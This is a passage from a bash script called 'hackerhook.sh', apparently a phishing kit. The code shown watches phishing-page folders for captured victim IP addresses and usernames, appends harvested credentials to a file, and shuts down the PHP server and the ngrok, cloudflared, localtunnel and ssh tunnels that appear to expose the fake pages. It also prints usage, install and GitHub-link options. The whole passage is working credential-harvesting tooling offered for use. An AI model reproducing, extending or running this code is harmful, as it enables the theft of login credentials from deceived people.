                cat webpage/credentials.txt >> Credentials

            fi
    #======================================
        printf "${UGreen}Saved: ${White}Credentials\e[0m\n"
        printf "\n"
        printf "${BYellow}Warning...\n${BRed}About to Close!\n"
        sleep 5
        killall -2 php > /dev/null 2>&1
        killall -2 lt > /dev/null 2>&1
        killall -2 xterm > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
        killall -2 cloudflared > /dev/null 2>&1
        killall ssh > /dev/null 2>&1
        

            if [[ -e sendlink ]]; then
                rm -rf sendlink

            fi
            if [[ -e xtermtunnel ]]; then
                rm xtermtunnel

            fi
            if [[ -e xtermflared ]]; then
                rm xtermflared

            fi
            printf "${BGreen}Done!"
            exit 1

    }

    getcredentials() {
        printf "${Yellow}Up and Running ...\e[0m\n"
            while [ true ]; do


            if [[ -e "webpage/$site/usernames.txt" ]]; then
                printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
                catch_cred

            fi
                sleep 1

            done 


    }

    catch_ip() {

        getcredentials

    }

    checkfound() {

        printf "\n"
        printf "${BRed}Waiting for Possible Credentials [ctrl+c] to stop.\n"
            while [ true ]; do

            if [[ -e "webpage/$site/ip.txt" ]]; then
                printf "${Green}IP Found!\n"
                catch_ip
                rm -rf webpage/$site/ip.txt
            fi
                sleep 0.5
            if [[ -e "webpage/$site/usernames.txt" ]]; then
                printf "${Green}Credentials Found!\n"
                catch_cred
                rm -rf webpage/$site/usernames.txt
            fi
                sleep 0.5
            done 

    }

            if [[ "$1" == "-v" || "$1" == "--version" ]]; then
                banner3
                #printf "${BGreen}Version ${version}"
                exit 1
                
            elif [[ "$1" == "-h" || "$1" == "--help" ]]; then
                banner3
                printf "${BGreen}"
                printf "usage: ./hackerhook.sh [run] [-h for help] [-i for dependencies check] [-v check version]\n"
                echo "-h  --help        =     show this help message and exit"
                echo "-i  --install     =     install required dependencies"
                echo "-g  --github      =     Johnsmith80 github link."
                echo "-v  --version     =     show current version of hacker-hook"
                echo ""
                exit 1

            elif [[ "$1" == "-i" || "$1" == "--install" ]]; then
                printf "${clr}\n"
                printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇ ${BGreen}Version: ${BRed}${version}\n"
                printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
                printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
                printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
                printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
                printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢉⣡⣤⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀⠀${BRed}⢸⣇\n"
                printf "${BGreen}⠀⠀⠙⣿⣷⣦⡀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⠋⠉⣿⠟⠁⠀⠀${BRed}⢸⡟\n"
                printf "${BGreen}⠀⠀⠀⢸⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠖⠁⠀⠀${BRed}⣷⡄⢸⡇\n"
                printf "${BGreen}⠀⠀⠀⠀⣿⠁⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀${BRed}⢿⣀⣸⡇\n"
                printf "${BGreen}⠀⠀⠀⠀⣿⣷⣤⣈⠛⠻⢿⣿⡿⢁⣼⣿⣿⡿⠛⣿⣿⣿⣦⣄⡀${BRed}⠈⠉⠉⠁\n"
                printf "${BGreen}⠀⠀⠀⢀⣿⡿⠟⠁⠀⠀⠀⠀⠀⠛⠉⠉⠠⠤⠾⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀\n"
                printf "${BGreen}⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
                printf "\n${clr}\n"
                printf "${BGreen}[${BRed}☣${BGreen}]${BGreen}Checking for dependencies:\n"
                installdependencies    

            elif [[ "$1" == "-g" || "$1" == "--github" ]]; then
                banner3
                printf "${BGreen}"
                printf "Github link: https://github.com/${BPurple}johnsmith80/\n${clr}"
                printf "${BGreen}"
                printf "Hacker-Hook: https://github.com/${BPurple}johnsmith80/${BBlack}Hacker-Hook\n${clr}"
                exit 1
            
            elif [[ "$1" == "" ]]; then
                stop1
                banner
                dependencies
                menu

            elif [[ "$1" == "run" ]]; then
                stop1
                banner
                dependencies
                menu

            else
                banner3
                printf "${BRed}[!] sudo ./hackerhook.sh [$1] invalid arguments!${clear}\n"
                printf "${BCyan}[#] Run ${BGreen}sudo ./hackerhook.sh -h or README.md${clear}\n"
                exit 1

            fi


#stop1
#banner
#dependencies
#menu

fi
